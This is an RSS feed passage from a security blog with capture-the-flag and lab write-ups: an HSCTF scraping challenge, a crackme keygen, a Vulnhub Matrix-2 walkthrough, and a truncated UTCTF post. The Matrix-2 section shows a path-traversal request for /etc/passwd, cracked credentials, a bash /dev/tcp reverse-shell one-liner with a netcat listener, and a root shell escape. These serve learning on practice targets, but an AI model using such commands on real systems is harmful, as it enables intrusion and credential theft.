      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/hsctf/thumb.PNG" title="banner" class="gallery-item"><img src="/img/hsctf/thumb.PNG" alt="banner"></a></p><p><a href="https://ctftime.org/event/">HSCTF</a> was a medium level 5 day long CTF.<br>New Challenges were being released every day, so basically it was fun.  </p><blockquote><p>Our Team Dc1ph3R finished 19th globally.  </p></blockquote><p>I will be discussing a web challenge today which is more likely to be a scripting challenge according to me.  </p><p><a href="/img/hsctf/chall.PNG" class="gallery-item"><img src="/img/hsctf/chall.PNG"></a></p><blockquote><p>Download <a href="/files/hsctf/index.html"  target="_blank">index.html</a></p></blockquote><p>After opening the index.html in our browser we see a Label “Magic Number Generator” along with an input field..  </p><p><a href="/img/hsctf/1.PNG" class="gallery-item"><img src="/img/hsctf/1.PNG"></a></p><p>So I tried to tinker around with the web app.<br>I entered some text randomly and it redirected me to a google search with “I like 1”.   </p><p><a href="/img/hsctf/2.PNG" class="gallery-item"><img src="/img/hsctf/2.PNG"></a></p><p>I tried once more and again got the same search text…  </p><p>Viewing the source gave some gibberish text within the script tags.  </p><p><a href="/img/hsctf/3.PNG" class="gallery-item"><img src="/img/hsctf/3.PNG"></a></p><p>But after opening the Dev Console on the Browser gave some meaningful Javascript and HTML code.  </p><p><a href="/img/hsctf/4.PNG" class="gallery-item"><img src="/img/hsctf/4.PNG"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">role</span>=<span class="string">&quot;option&quot;</span> <span class="attr">aria-posinset</span>=<span class="string">&quot;291&quot;</span> <span class="attr">aria-setsize</span>=<span class="string">&quot;1040&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>There is a DIV with an ID <strong>list</strong> and which is using ARIA (Accessible Rich Internet Applications).<br>More info about ARIA <a href="https://en.wikipedia.org/wiki/WAI-ARIA">here</a>.  </p><p>So the JS Code basically selects a random child from the DIV and gets the binary digit.<br>It checks whether the key pressed is “ENTER” and then carries a Google search by concatenating the binary digit to the string <strong>“I like “</strong>.<br>So Technically there is no use of our input.. XD  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">window</span>.onload = <span class="function">() =&gt;</span> </span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;search-box&quot;</span>).onkeypress = <span class="function">(<span class="params">e</span>) =&gt;</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(e.keyCode === <span class="number">13</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">window</span>.location = <span class="string">&quot;https://www.google.com/search?q=i+like+&quot;</span> +  </span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">&quot;list&quot;</span>).children[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() *  </span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">&quot;list&quot;</span>).children.length)].innerText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It came me that these binary digits can give out an ascii text after joining them.</span></span><br><span class="line"><span class="string">But the order of arrangement was not right...  </span></span><br><span class="line"><span class="string">After looking into another property of the div items defined in the source, I observed that the [aria-posinset](https://www.maxability.co.in/2015/09/27/aria-posinset-property/) property is used to give an element’s number or position in the current set of listitems or treeitems.  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Next I fired up Sublime to bake some Python and make use of my favourite library **BeautifulSoup**.  </span></span><br><span class="line"><span class="string">As the original index.html contained obfuscated code, I copied the code from the Dev Console and created a new html file named aria.html.   </span></span><br><span class="line"><span class="string">At first, we may want to know the number of digits and see if their total is divisible by 8 so as to confirm that it is a perfect binary to text conversion case.  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>py</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;aria.html&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    soup = BeautifulSoup(fp,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">binDig = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;role&#x27;</span>:<span class="string">&quot;option&quot;</span>&#125;):</span><br><span class="line">    binDig.append(int(item[<span class="string">&#x27;aria-posinset&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">print(len(binDig))</span><br></pre></td></tr></table></figure><p>After running the above script, the total no. of items came out to be 1040 which is perfectly divisible by 8.  </p><blockquote><p>1040/8 = 130  </p></blockquote><p>It confirms that we’ll get 130 chars after scraping the binary digits. </p><p>Now we sort them according to their corresponding aria-posinset property and convert all the scraped binaries into ascii with the following python script.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary2ascii</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aria.html&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    soup = BeautifulSoup(fp,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">flag=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1040</span>):</span><br><span class="line">    flag.append(soup.find(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;aria-posinset&#x27;</span>:<span class="built_in">str</span>(i)&#125;).contents[<span class="number">0</span>])</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        print(binary2ascii(<span class="string">&quot;&quot;</span>.join(flag)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        flag.clear()</span><br></pre></td></tr></table></figure><p>And finally we are presented with the some text along with our flag.  </p><blockquote><p>im gonna add some filler text here so the page is a bit longer. lorem ipsum… here’s the flag btw, flag{accessibility_is_crucial}</p></blockquote><p>Coming up are some writeups from BCA CTF.</p><p>So Make sure to subscribe to the newsletter to learn together with me.<br>Also Comment your feedbacks and share this writeup with your friends.  </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/hsctf/">hsctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/web/">web</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/scraping/">scraping</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/aria/">aria</category>
      
      
      <comments>https://mrt4ntr4.github.io/HSCTF-ARIA-Writeup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Windows Crackme 1</title>
      <link>https://mrt4ntr4.github.io/Win-Crackme1/</link>
      <guid>https://mrt4ntr4.github.io/Win-Crackme1/</guid>
      <pubDate>Tue, 21 May 2019 00:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/winrev/try3.jpg" title="banner" class="gallery-item"><img src="/img/winrev/try3.jpg" alt="banner"></a></p><p>In this post we are going to crack a windows based crackme built using cpp.<br>It has been a while since I’ve done any reversing so I grabbed some crackmes from <a href="https://crackmes.one/">crackmes.one</a>  </p><p>There is no need of WinDbg(or any other debugger) to crack it as it is somewhat easy.<br>Also no need of pseudocode as the code can easily be reversed from the assembly.<br>And obviously it is unpacked.  </p><p>So Now Let’s get this baby!!</p><hr><h1 id="Keygenme-Easy-1"><a href="#Keygenme-Easy-1" class="headerlink" title="Keygenme_Easy_1 "></a>Keygenme_Easy_1 </h1><h4 id="by-subminking"><a href="#by-subminking" class="headerlink" title="by subminking"></a>by subminking</h4><p><a href="https://crackmes.one/crackme/5ab77f6533c5d40ad448cb99">Download Link</a></p><p>The crackme is levelled as easy and is a 1 point crackme but at the same time it acts as a good playground for learning assembly.  </p><p><a href="/img/winrev/c1/1.PNG" class="gallery-item"><img src="/img/winrev/c1/1.PNG"></a>  </p><p>After firing up IDA, I straightaway opened the referenced strings view and found the <em>Congratulations</em> String</p><p><a href="/img/winrev/c1/2.PNG" class="gallery-item"><img src="/img/winrev/c1/2.PNG"></a>  </p><p>Going through the WinMain() function there is a call to DialogFunc() which is responsible for creating a dailogbox and getting the user inputs..  </p><p><a href="/img/winrev/c1/3.PNG" class="gallery-item"><img src="/img/winrev/c1/3.PNG"></a>  </p><p>So we observe that all inputs are entered with the help of <strong>GetDlgItemTextA</strong> Function.<br>And further there is a call to <strong>sub_401040()</strong>. </p><p><a href="/img/winrev/c1/4.PNG" class="gallery-item"><img src="/img/winrev/c1/4.PNG"></a>  </p><p>So <strong>sub_401040()</strong> begins with loading some memory from the data segment into the EAX register and then XORs it with ESP and storing that on the stack at ESP+190. Ok, leaving that for a while now!!<br>We see that the offset of the name we entered is moved into EAX and then it is perfectly loaded onto the EDX register.  </p><p><a href="/img/winrev/c1/5.PNG" class="gallery-item"><img src="/img/winrev/c1/5.PNG"></a>  </p><p>Now the Game of Length comes into Play !!<br>It now computes the length of our Name and verifies if it is less or equal to 0x0A(Dec = 10)…  </p><p>So we can enter our string accordingly…</p><p>I’ll be following the condition where it’s length is &lt; 10.<br>You can also try the other one yourself.  </p><p><a href="/img/winrev/c1/6.PNG" class="gallery-item"><img src="/img/winrev/c1/6.PNG"></a> </p><p>Now there is a Jump to <strong>loc_4010DA</strong>.<br>And the name is stored in the stack.  </p><p><a href="/img/winrev/c1/7.PNG" class="gallery-item"><img src="/img/winrev/c1/7.PNG"></a>  </p><p>Also now the EAX which contains our NAME is loaded.  </p><p>And Now Basically the length is computed again and put into EAX.  </p><p><a href="/img/winrev/c1/8.PNG" class="gallery-item"><img src="/img/winrev/c1/8.PNG"></a>  </p><p>Now the main serial generation process starts  </p><p>The Various Steps are as follows:  </p><p>The ESI register is given a value of 3.<br>The Value of ESI is put into EDX.<br>Then the location of NAME in the stack is assigned to EDI.<br>The value of EDX(ie. 3) is subtracted from EDI.<br>Now EDX Register holds the address of the location 3 bytes after name on stack.  </p><p><a href="/img/winrev/c1/9.PNG" class="gallery-item"><img src="/img/winrev/c1/9.PNG"></a>  </p><p>The Value of EAX is now assigned to EBX.  </p><p>And now the Control passes to <strong>loc_401120</strong>.  </p><p>Now as [EDI+EDX] = [+ 3 Bytes - 3 Bytes] taking the starting location of NAME as a reference.<br>Therefore Name[i] is assigned to the EAX Register.<br>FYI, The ASCII Value of Name[i] is loaded into EAX.<br>Now ECX is loaded with a value of EDX + EAX.<br>Now there are some simple arithmetic operations which are included in the keygen which you can refer to the Opcodes and learn what is happening behind the scene…  They are super easy!!!   </p><p>There is also an operation of adding esi, ecx and 0x1341 and putting the result into esi.<br><a href="/img/winrev/c1/10.PNG" class="gallery-item"><img src="/img/winrev/c1/10.PNG"></a>  </p><p>At last after getting every Character’s ASCII Value from NAME and doing various operations with it, there is an AND Operation between ESI(result) and 0xDEADBEEF whose result is added to ESI itself.<br>And Later the Serial is checked with the value of ESI and <em>Congratulations</em> statement is printed on a Dialog.  </p><p><a href="/img/winrev/c1/11.PNG" class="gallery-item"><img src="/img/winrev/c1/11.PNG"></a>  </p><p>Time for our Ultimate KeyGen !!!<br>I knew you were waiting for it.. weren’t you XD.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">list</span>(<span class="string">&quot;mrT4ntr4&quot;</span>)</span><br><span class="line">esi = <span class="number">3</span></span><br><span class="line">edx = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">  eax = <span class="built_in">ord</span>(i)</span><br><span class="line">  ecx = edx + eax</span><br><span class="line">  ecx *= esi</span><br><span class="line">  esi = eax*<span class="number">8</span></span><br><span class="line">  esi -= eax</span><br><span class="line">  edx = edx + <span class="number">1</span></span><br><span class="line">  esi += ecx + <span class="number">0x1341</span></span><br><span class="line">esi &amp;= <span class="number">0xDEADBEEF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> esi</span><br></pre></td></tr></table></figure><p>Run the above Python Keygen Script to get a working Serial for your NAME..   </p><p><a href="/img/winrev/c1/done.PNG" class="gallery-item"><img src="/img/winrev/c1/done.PNG"></a>  </p><p>And AbraKaDabra!! Magic Trick Revealed By MrT4ntr4  </p><a href="https://media.giphy.com/media/3o7TKnvDNYADdLYZIQ/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/3o7TKnvDNYADdLYZIQ/giphy.gif" alt="drawing" width="300"/></a><p>There is a variety of crackmes on my checklist built with .NET, Java, Visual C++, etc..<br>I’ll be writing about some of my favorites among them in my upcoming writeups.  </p><p>So Make sure to subscribe to the newsletter to learn together with me.<br>Also Comment your feedbacks and share this writeup with your friends.  </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/crackmes-one/">crackmes.one</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/Reversing/">Reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Tutorial/">Tutorial</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Windows/">Windows</category>
      
      
      <comments>https://mrt4ntr4.github.io/Win-Crackme1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Matrix-2 Writeup</title>
      <link>https://mrt4ntr4.github.io/Matrix-2-Writeup/</link>
      <guid>https://mrt4ntr4.github.io/Matrix-2-Writeup/</guid>
      <pubDate>Mon, 01 Apr 2019 00:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/matrix2/redblue.jpg" title="banner" class="gallery-item"><img src="/img/matrix2/redblue.jpg" alt="banner"></a></p><p>To begin with, I took some time from my so called <em>Busy</em> routine XD and rooted Matrix-2 from vulnhub which is a successor to the Matrix series..<br>If you haven’t checked the <a href="https://mrt4ntr4.github.io/Matrix-Writeup/" target="_blank">first one</a>, Plz do .. if you really are a MATRIX Fan. XD  </p><p>Download <a href="https://www.vulnhub.com/entry/matrix-2,279/" target="_blank">here</a></p><p>Also Thanks <a href="https://twitter.com/unknowndevice64" target="_blank">./unknowndevice64</a><br> for adding another child to the Matrix Series.  </p><p>And you see, I keep my promise. For those of you who don’t know it, I promised that  I’ll bring my writeup on the second one in Matrix-1 writeup.</p><p>So Yeah!! Our machine booted successfully..</p><p><a href="/img/matrix2/1.png" class="gallery-item"><img src="/img/matrix2/1.png"></a></p><h1 id="Netdiscover-Scan"><a href="#Netdiscover-Scan" class="headerlink" title="Netdiscover Scan"></a>Netdiscover Scan</h1><p>To begin with, I did a netdiscover scan to find the IP of the matrix machine running on VirtualBox.  </p><p><a href="/img/matrix2/2.png" class="gallery-item"><img src="/img/matrix2/2.png"></a></p><h1 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h1><p>And then moving on further, we get port 80, 1337, 12320 and 12322 as opened ports.  </p><p>Hell these are a lot of ports.. ikr  </p><p><a href="/img/matrix2/3.png" class="gallery-item"><img src="/img/matrix2/3.png"></a><br><a href="/img/matrix2/4.png" class="gallery-item"><img src="/img/matrix2/4.png"></a><br><a href="/img/matrix2/5.png" class="gallery-item"><img src="/img/matrix2/5.png"></a></p><p>And One more thing! Dirb Scan didn’t help.  </p><h1 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h1><p>Checking the default HTTP Port ie 80, we get some twinking stars as background and my curiosity took me to <a href="https://codepen.io/WebSonick/pen/vjmgu" target="_blank">this</a> codepen’s snippet. And some text saying <strong>Welcome In Matrix v2, Mr.NEO</strong></p><p><a href="/img/matrix2/6.png" class="gallery-item"><img src="/img/matrix2/6.png"></a></p><p>Further checking the source code of the page, I found a suspicious javascript file <strong>index.js</strong>  </p><p><a href="/img/matrix2/7.png" class="gallery-item"><img src="/img/matrix2/7.png"></a></p><p>I didn’t know really what was it meant for.<br>Was it a part of the page’s animation stuff or just a troll related to the MATRIX Movie.<br>You might be wondering why does he even want us to know this shit…<br>But this shit was really not important XD.  </p><p><a href="/img/matrix2/8.png" class="gallery-item"><img src="/img/matrix2/8.png"></a></p><p>So taking a keen look at some other ports.  </p><p>I found that both ports 1337 and 12320 had a login prompt.  </p><p><a href="/img/matrix2/9.png" class="gallery-item"><img src="/img/matrix2/9.png"></a></p><p><a href="/img/matrix2/10.png" class="gallery-item"><img src="/img/matrix2/10.png"></a></p><p>But the 12322 gave me a lead as the robots.txt had a disallowed entry for a file named <strong>file_view.php</strong></p><p><a href="/img/matrix2/11.png" class="gallery-item"><img src="/img/matrix2/11.png"></a></p><p>Navigating to the file in our browser gave us a blank white page.. which is quite sad.  </p><p><a href="/img/matrix2/12.png" class="gallery-item"><img src="/img/matrix2/12.png"></a></p><p>But no problem, we still have the almighty source.<br>And It commented <em>Error file parameter missing</em>  </p><p><a href="/img/matrix2/13.png" class="gallery-item"><img src="/img/matrix2/13.png"></a>   </p><p>So I then used some parameters with a GET Request as well like …  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.42.201:12322/file_view.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>and still got the f** <strong>blank white page</strong>  </p><p>But after some time, I tried my luck with Burp and to my surprise I was able to view the contents of <strong>/etc/passwd</strong> file and it was a directory traversal exploit.  </p><p><a href="/img/matrix2/14.png" class="gallery-item"><img src="/img/matrix2/14.png"></a>  </p><p>As you can see from the Screenshot that I changed my Request to Post and especially the following :  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>This was really important with burp as it was simply showing that blank page repeatedly when tried with no Content-Type.<br>TBH It took a while to figure this out.. XD<br>Well I learnt something !!</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><a href="/img/matrix2/15.png" class="gallery-item"><img src="/img/matrix2/15.png"></a>  </p><p>So Now we know that there is a user named <strong>n30</strong></p><p>Not only this.. I was also able to see <strong>/proc/version</strong>  </p><p><a href="/img/matrix2/16.png" class="gallery-item"><img src="/img/matrix2/16.png"></a>  </p><p>and <strong>/etc/crontab</strong>  to see the scheduled jobs.  </p><p><a href="/img/matrix2/17.png" class="gallery-item"><img src="/img/matrix2/17.png"></a>  </p><p>Well <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">this</a> blogpost is really a heaven in case of Linux Priv Esc. </p><p>And as we can observe the server is nginx in the Response Headers !! It was obvious to check <strong>/etc/nginx/sites-available/default</strong>  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><a href="/img/matrix2/18.png" class="gallery-item"><img src="/img/matrix2/18.png"></a>  </p><p>Here we see that a password is stored in <strong>/var/www/p4ss/.htpasswd</strong><br>Ok np lets take a look at that too.  </p><p><a href="/img/matrix2/19.png" class="gallery-item"><img src="/img/matrix2/19.png"></a>  </p><p>And hell yeah we are presented with a password hash for a user named <strong>Tr1n17y</strong>     </p><p><a href="/img/matrix2/20.png" class="gallery-item"><img src="/img/matrix2/20.png"></a>  </p><p>Now heading over to some noob methods of cracking a password hash, I use john with my wordlist as the common rockyou.txt.  </p><p><a href="/img/matrix2/21.png" class="gallery-item"><img src="/img/matrix2/21.png"></a>  </p><p>Later, I use the following creds to login into 1337 port’s login prompt.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: Tr1n17y</span><br><span class="line">Password: admin</span><br></pre></td></tr></table></figure><p><a href="/img/matrix2/22.png" class="gallery-item"><img src="/img/matrix2/22.png"></a>  </p><p>Now, as we know from the /etc/passwd file that there is a user named n30. Here we get some red text with the same.  </p><p><a href="/img/matrix2/23.png" class="gallery-item"><img src="/img/matrix2/23.png"></a>  </p><p>But going through the source, Everything looked similar to the 80’s port except all the css and js files were being imported from the <strong>/4cc3ss</strong> dir.  I don’t know whether there was another method of exploitation or anything like that..  </p><p><a href="/img/matrix2/24.png" class="gallery-item"><img src="/img/matrix2/24.png"></a>  </p><p>Also there was a jpeg file commented out named <strong>h1dd3n.jpg</strong> which was a classic steganography chall.  </p><p><a href="/img/matrix2/25.png" class="gallery-item"><img src="/img/matrix2/25.png"></a>  </p><p>I downloaded the image and used my own tool ie. <a href="https://github.com/mrT4ntr4/Stegall" target="_blank">Stegall</a> (AKA The father of all stego tools) XD.</p><p>I used steghide with the password as n30 which can easily be guessed, atleast by me.  </p><p><a href="/img/matrix2/26.png" class="gallery-item"><img src="/img/matrix2/26.png"></a>  </p><p>And Later I used these Creds to login into port 12322’s prompt.</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: n30</span><br><span class="line">Password: p4$$w0rd</span><br></pre></td></tr></table></figure><p>Now we can also get a reverse shell incase you don’t like a webshell like me.. XD<br>I used <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">this</a> reverse shell cheatsheet from pentestmonkey to grab a oneliner. </p><p>I checked my IP and choosed my port to be 4433.  </p><p><a href="/img/matrix2/27.png" class="gallery-item"><img src="/img/matrix2/27.png"></a>   </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><a href="/img/matrix2/28.png" class="gallery-item"><img src="/img/matrix2/28.png"></a>  </p><p>Well we require a listener also..  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4433</span><br></pre></td></tr></table></figure><p><a href="/img/matrix2/29.png" class="gallery-item"><img src="/img/matrix2/29.png"></a>  </p><p>And as we know we are USER.</p><p><a href="/img/matrix2/30.png" class="gallery-item"><img src="/img/matrix2/30.png"></a>  </p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>This was the easiest machine particularly for Priv Esc I’ve found on vulnhub.. as of now, as you can see there are barely 3 screenshots lying below XD</p><p>Now I gather some info using <strong>ls</strong> ofc.<br>And my boy there it is <strong>.bash_history</strong>.  </p><p><a href="/img/matrix2/31.png" class="gallery-item"><img src="/img/matrix2/31.png"></a>  </p><p>After reading its content, it is pretty obvious that someone had tried the command :</p><pre><code class="sh">morpheus &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;```shand got the root flag..  ![](/img/matrix2/32.png)  Literally I didn&#39;t knew what the hell was **morpheus** before this machine.. So I googled a bit and found that it was just another CLI with more functionalities and stuff.  You can read the docs &lt;a href=&quot;https://docs.morpheusdata.com/en/3.6.1/getting_started/cli/cli_master.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.So simply repeating it, we can too get it ryt...  ![](/img/matrix2/33.png)  and B00mYa !! This machine was pretty interesting as it focuses on some minute details of enumerating a machine.  And Hey If you like my posts please subscribe to my newsletter.. It&#39;ll barely take a minute. And you see there is no f** popup which forces you to subscribe ... HAHA Also If you have some suggestions for improvements and If I&#39;ve mistaken somewhere in explaining you can just write it down in the comments section.Meet you with another post!! Till then, Happy Hacking :)</code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/boot2root-VMs/">boot2root VMs</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/boot2root/">boot2root</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/matrix2/">matrix2</category>
      
      
      <comments>https://mrt4ntr4.github.io/Matrix-2-Writeup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UTCTF 19 [ Regular Zips ]</title>
      <link>https://mrt4ntr4.github.io/UTCTF-RegularZips-Writeup/</link>
      <guid>https://mrt4ntr4.github.io/UTCTF-RegularZips-Writeup/</guid>
      <pubDate>Sun, 10 Mar 2019 23:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/utctf/utctfthumb.png" title="banner" class="gallery-item"><img src="/img/utctf/utctfthumb.png" alt="banner"></a></p><p>To start with, UTCTF 2019 had pretty high scores for every challenge ie. The points were ranged from 100 to 2000.<br>And They were all fun to solve, But I personally liked <strong>Regular Zips</strong> as I learn a lot about Regular Expressions and ofcourse python’s awesomeness. XD</p><p><a href="/img/utctf/challthumb.png" class="gallery-item"><img src="/img/utctf/challthumb.png"></a></p><p>Download <a href="/files/utctf/RegularZips.zip"  target="_blank">RegularZips.zip</a> &amp; <a href="/files/utctf/problem.txt"  target="_blank">problem.txt</a></p><p>Being a 600 pts challenge, it was somewhat a medium level challenge.<br>Thanks to my friend <a href="https://github.com/Himanshukr000"  target="_blank">@HimanshuKr</a> who helped me with this challenge.</p><p>So I started with the given regular expression in the 